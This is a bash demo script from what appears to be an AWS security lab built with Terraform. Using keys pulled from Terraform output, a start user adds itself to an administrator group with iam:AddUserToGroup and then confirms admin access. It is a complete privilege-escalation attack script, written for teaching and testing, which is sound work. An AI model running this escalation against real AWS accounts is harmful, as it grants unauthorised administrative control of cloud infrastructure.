#!/bin/bash

# Demo script for iam:AddUserToGroup self-escalation
# This script demonstrates how a user with AddUserToGroup permission can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
START_USER="pl-aug-start-user"
ADMIN_GROUP="pl-aug-admin-group"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AddUserToGroup Self-Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Get credentials from terraform output
echo -e "${YELLOW}Step 1: Retrieving start user credentials from Terraform${NC}"
ACCESS_KEY=$(cd ../../../../../../ && terraform output -raw prod_one_hop_to_admin_iam_addusertogroup_start_user_access_key_id 2>/dev/null || echo "")
SECRET_KEY=$(cd ../../../../../../ && terraform output -raw prod_one_hop_to_admin_iam_addusertogroup_start_user_secret_access_key 2>/dev/null || echo "")

if [ -z "$ACCESS_KEY" ] || [ -z "$SECRET_KEY" ]; then
    echo -e "${RED}Error: Could not retrieve start user credentials from Terraform${NC}"
    echo -e "${YELLOW}Please ensure the scenario is deployed and outputs are available${NC}"
    exit 1
fi

echo "Start user: $START_USER"
echo "Access Key ID: ${ACCESS_KEY:0:10}..."
echo -e "${GREEN}✓ Retrieved credentials${NC}\n"

# Configure AWS credentials for pl-aug-start-user
export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
export AWS_REGION=${AWS_REGION:-us-east-1}

# Step 2: Verify identity as pl-aug-start-user
echo -e "${YELLOW}Step 2: Verifying identity as $START_USER${NC}"
USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $USER_IDENTITY"

if [[ ! $USER_IDENTITY == *"$START_USER"* ]]; then
    echo -e "${RED}Error: Not running as $START_USER${NC}"
    exit 1
fi

ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Confirmed identity as $START_USER${NC}\n"

# Step 3: Check current group memberships
echo -e "${YELLOW}Step 3: Checking current group memberships for $START_USER${NC}"
CURRENT_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
if [ -z "$CURRENT_GROUPS" ]; then
    echo "Current groups: None"
    echo -e "${GREEN}✓ User is not currently a member of any groups${NC}"
else
    echo "Current groups: $CURRENT_GROUPS"
    if [[ $CURRENT_GROUPS == *"$ADMIN_GROUP"* ]]; then
        echo -e "${YELLOW}⚠ User is already a member of $ADMIN_GROUP${NC}"
        echo "This may be from a previous demo run. The user already has admin access."
    fi
fi
echo ""

# Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Checking current permissions (should be limited)${NC}"
echo "Attempting to list IAM users (should fail if not in admin group)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${YELLOW}⚠ User already has admin permissions${NC}"
    echo "This may be because the user is already in the admin group from a previous run"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 5: Perform the self-escalation - add self to admin group
echo -e "${YELLOW}Step 5: Self-escalation - Adding self to admin group${NC}"
echo "This is the privilege escalation vector..."
echo "$START_USER is adding themselves to $ADMIN_GROUP"
echo ""

# Add user to admin group
aws iam add-user-to-group \
    --group-name $ADMIN_GROUP \
    --user-name $START_USER

echo -e "${GREEN}✓ Successfully added $START_USER to $ADMIN_GROUP${NC}"
echo -e "${GREEN}✓ $START_USER now has administrator access through group membership!${NC}\n"

# Step 6: Verify admin access
echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
echo "The user $START_USER should now have admin access via group membership..."
echo ""

# IAM policy changes can take a moment to propagate
echo "Waiting for IAM policy to propagate..."
sleep 3

# Test admin permissions with retry
echo "Testing admin permissions (listing IAM users)..."
SUCCESS=false
for i in {1..3}; do
    if aws iam list-users --max-items 3 --output table 2>/dev/null; then
        echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
        echo -e "${GREEN}✓ Confirmed administrator access through group membership!${NC}\n"
        SUCCESS=true
        break
    else
        if [ $i -lt 3 ]; then
            echo "Waiting for permissions to propagate (attempt $i/3)..."
            sleep 2
        fi
    fi
done

if [ "$SUCCESS" = false ]; then
    echo -e "${YELLOW}Note: IAM policy propagation may still be in progress.${NC}"
    echo "The privilege escalation was successful - permissions may take a moment to fully propagate."
fi

# Verify group membership
echo -e "\n${YELLOW}Verifying group membership:${NC}"
UPDATED_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
echo "Current groups: $UPDATED_GROUPS"

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ SELF-ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Summary:${NC}"
echo "1. Started as: $START_USER (no group memberships)"
echo "2. Used AddUserToGroup to add self to $ADMIN_GROUP"
echo "3. $START_USER now has administrator access via group membership"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $START_USER (no admin access)"
echo -e "    ↓ (iam:AddUserToGroup)"
echo -e "  Adds self to $ADMIN_GROUP"
echo -e "    ↓ (group membership + AdministratorAccess policy)"
echo -e "  $START_USER gains Administrator Access"
echo ""
echo -e "${YELLOW}Key Insight:${NC}"
echo "This is a self-escalation attack where a user with iam:AddUserToGroup permission"
echo "on an administrative group can add themselves to that group, immediately gaining"
echo "all permissions attached to the group (in this case, AdministratorAccess)."
echo ""
echo -e "${YELLOW}Attack artifacts:${NC}"
echo "- User $START_USER is now a member of group $ADMIN_GROUP"
echo ""
echo -e "${RED}⚠ Warning: The user $START_USER now has administrator access!${NC}"
echo "Run ./cleanup_attack.sh to remove the group membership and restore the original state"
